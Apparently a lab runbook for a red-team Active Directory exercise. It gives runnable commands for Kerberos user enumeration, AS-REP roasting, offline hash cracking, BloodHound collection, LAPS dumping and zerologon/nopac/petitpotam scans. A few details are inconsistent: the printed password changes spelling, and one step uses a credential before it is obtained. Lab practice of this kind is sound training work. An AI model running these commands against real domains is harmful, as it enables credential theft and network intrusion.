# CAMPAIGNS v2 — Phase 1 — Initial Access (AS-REP Roast)

> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

## Main Spine — Credential Chain

### Phase 1 — Initial Access (WT003: AS-REP Roast)


**Scenario:** You're a contractor working from the company's internal network. Your Kali machine (192.168.77.60) has LAN access to the `child.cadre.local` domain controller (dc02, 192.168.77.11). You don't have domain credentials yet — only network access.

#### Step 1 — Discover valid usernames

From the reconnaissance above, Kerberos user enum already identified valid accounts in both domains. We can also use kerbrute for a more targeted scan:

```bash
kerbrute userenum -d child.cadre.local --dc 192.168.77.11 /usr/share/wordlists/names.txt
```

The scan reveals several valid accounts. One stands out: `intern_blue`.


|                   |                                                                    |
| ----------------- | ------------------------------------------------------------------ |
| **Target**        | `intern_blue` — child.cadre.local user with `DONT_REQUIRE_PREAUTH` |
| **From**          | Kali (192.168.77.60) → dc02 (192.168.77.11)                        |
| **Starting cred** | None (zero knowledge)                                              |
| **What you earn** | `1nt3rn_Blu3!` — low-privilege credential in child.cadre.local     |


#### Step 2 — Check for AS-REP roastable users

From the discovered user list, test for accounts that don't require Kerberos pre-authentication:

```bash
# Original (impacket)
impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 -no-pass -usersfile /tmp/valid_users.txt

# Alternative (NetExec with --kdcHost — CRITICAL for multi-DC environments)
nxc ldap 192.168.77.11 -u intern_blue -p '1nt3rn_Blu3!' --asreproast /tmp/asrep_ib.txt --kdcHost 192.168.77.11
# --kdcHost flag fixes "KDC routing quirk" — without it, AS-REQ may be sent to an unreachable DC
```

`intern_blue` returns an AS-REP hash. This means the account has `DONT_REQUIRE_PREAUTH` set on its `userAccountControl` attribute — a misconfiguration. The KDC has sent back a TGT encrypted with `intern_blue`'s RC4-derived key, which can be cracked offline.

```bash
hashcat -m 18200 asrep_hash.txt /home/vagrant/cadre_passwords.txt
```

```
$krb5asrep$23$intern_blue@CHILD.CADRE.LOCAL:... → 1nt3rn_Blu3!
```

**What happened:** An administrator mistakenly flagged `intern_blue`'s account as "Do not require Kerberos preauthentication" — perhaps to support a legacy Unix service or during a troubleshooting session. They never re-enabled it. This single checkbox on one user object gives us our first credential in the child domain.

> ~~**WT028 (null session) removed** — SAMR null bind blocked on Server 2025. **WT031 (password spray) pending relocation** — valid technique, needs a user list source. Kerberos user enumeration (above) replaces the recon function that null session used to serve.~~

---

#### 🔍 Reconnaissance with `intern_blue`

Now we have a valid domain credential (`intern_blue:1nt3rn_Blu3!`). Time to understand what this account can do.

```bash
bloodhound-python -d child.cadre.local -u intern_blue -p '1nt3rn_Blu3!' \
  -ns 192.168.77.11 -c All
```

Load the output (`/home/vagrant/20260602145912_bloodhound.zip` on Kali) into BloodHound CE.

**Finding 1 — ACE#18: intern_blue → analyst_t2: ForceChangePassword**
`intern_blue` can reset `analyst_t2`'s password without knowing the original. This is a direct privilege escalation path — but there's a catch.

**Why this matters:** `intern_blue` has `DONT_REQUIRE_PREAUTH`. When `getTGT.py` tries to obtain a TGT for `intern_blue`, it fails because the KDC skips pre-auth and returns an error. dc02's KDC also doesn't support the RC4 encryption type that Impacket uses for pre-auth. We're stuck — unless we use ACE#18 to bridge to a user with pre-auth enabled.

**Finding 2 — SPN on `svc_mssql`**
The user `svc_mssql` has an SPN registered: `MSSQLSvc/mbr01.child.cadre.local:1433` (registered by playbook `05-ad-attack-surface.yml` line 827). This means it's kerberoastable. If we can get a service ticket for this SPN and crack it, we get the SQL service account credential.

Together, these two findings define the next phase: use ACE#18 to gain the ability to request TGS tickets, then Kerberoast `svc_mssql`.

---

### Step 3 — NetExec Authenticated Recon (First Credential: `intern_blue`) 🆕

> ⚠️ **Flow correction (2026-06-24 session 10):** This recon step is run **after** we have `intern_blue` credentials (Phase 1 Step 2). At Phase 0 we don't have any credentials — that section is now strictly unauthenticated.

Now that we have a valid credential (`intern_blue:1nt3rn_Blu3!`), we can do real authenticated reconnaissance. Multiple tools at our disposal — pick the right one for the job.

**Primary: NetExec** (10 protocols, 16+ modules — replaces CME + much of impacket for quick recon):

```bash
# Quick auth check + signing state (the workhorse after gaining any cred)
nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_BLu3!'
# Output: GREEN [+]/RED [-]/BLUE [*] per host — confirms creds work + shows signing_required: True/False

# Full user enumeration (replaces ldapsearch + manual queries)
nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -q '(objectClass=user)' -attributes sAMAccountName
nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -q '(objectClass=computer)' -attributes sAMAccountName,operatingSystem
nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -q '(objectClass=group)' -attributes sAMAccountName

# SMB shares + LAPS dump (now we have creds to read them)
nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_BLu3!' --shares -M laps

# Vulnerability scan against all 3 DCs (5 modules in one command)
nxc smb 192.168.77.10,11,12 -u intern_blue -p '1nt3rn_BLu3!' -M nopac -M zerologon -M petitpotam

# NEW recon modules (added 2026-06-24)
# Pre-Windows 2000 computer account abuse check
nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -M pre2k --kdcHost 192.168.77.10
# AV/EDR enumeration (pre-attack OPSEC — confirms Defender only per our playbook)
nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_BLu3!' -M enum_av
# User description field enumeration (cheap password leak check)
nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' -M get-desc-users
# Delegation path discovery
nxc ldap 192.168.77.11 -u intern_blue -p '1nt3rn_BLu3!' --find-delegation
# adminCount=1 enumeration (AdminSDHolder stale privilege)
nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_BLu3!' --admin-count
```

**Alternative: bloodyAD** (Linux-friendly PowerView replacement, per Campaign_suggestions.md #91):

```bash
# User enumeration
bloodyAD --host 192.168.77.10 -d child.cadre.local -u intern_blue -p '1nt3rn_BLu3!' get object users --attr sAMAccountName
# Group enumeration
bloodyAD --host 192.168.77.10 -d child.cadre.local -u intern_blue -p '1nt3rn_BLu3!' get object groups
# Computer enumeration
bloodyAD --host 192.168.77.10 -d child.cadre.local -u intern_blue -p '1nt3rn_BLu3!' get object computers
# All users + group memberships
bloodyAD --host 192.168.77.10 -d child.cadre.local -u intern_blue -p '1nt3rn_BLu3!' get object users --resolve-members
```

**Alternative: ADeleg GUI** (visual verification — per Campaign_suggestions.md #99):

```powershell
# On mbr01 (domain-joined):
# 1. Copy ADeleg.exe to C:\Tools\
# 2. Run as intern_blue
# 3. View → Index View By → Trustees
# 4. Verify ACE#18 (intern_blue → analyst_t2: ForceChangePassword) is visible
# 5. View ADCS templates for ESC1-17 misconfigs
```

**Alternative: impacket** (for deeper queries):

```bash
# Get user details with extra attributes
impacket-lookupsid child.cadre.local/intern_blue:'1nt3rn_BLu3!'@192.168.77.11
# Get domain users via SAMR (if accessible)
impacket-samrdump child.cadre.local/intern_blue:'1nt3rn_BLu3!'@192.168.77.11
```

**What to expect (success):**
- ~50 user accounts enumerated across cadre.local + child.cadre.local
- ~10 computer accounts (DCs + member servers + workstations)
- ~30 groups with intern_blue's memberships documented
- LAPS password for mbr01 returned
- Vulnerability scan verdicts (nopac/zerologon/petitpotam per DC)
- AV/EDR: Defender only confirmed (per playbook)

**What to expect (failure modes):**
- LAPS module returns nothing: `ms-Mcs-AdmPwd` not configured (verify playbook ran)
- `--shares` returns ACCESS_DENIED: intern_blue doesn't have share access (expected for low-priv)
- Vulnerability scan fails: modules require specific OS/version compatibility

**CADRE-specific notes:**
- `intern_blue` is in `CN=Users,DC=child,DC=cadre,DC=local` (child domain)
- LAPS passwords: mbr01 has LAPS (per `04-vulnerabilities.yml`); mbr02 + DCs likely don't
- nxc `--kdcHost` flag is **CRITICAL** for multi-DC: `192.168.77.10` is cadre.local root; `192.168.77.11` is child.cadre.local

**Cross-references:**
- Campaign_suggestions.md #90 (NetExec full inventory), #91 (bloodyAD), #99 (ADeleg), #103 (UAC flags), #104 (machine account quota)
- See Phase 4 (BloodHound) — use the auth-recon data to seed BloodHound queries

---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-0.md`](CAMPAIGNS-RUNBOOK-0.md) · Next: [`CAMPAIGNS-RUNBOOK-2.md`](CAMPAIGNS-RUNBOOK-2.md) →
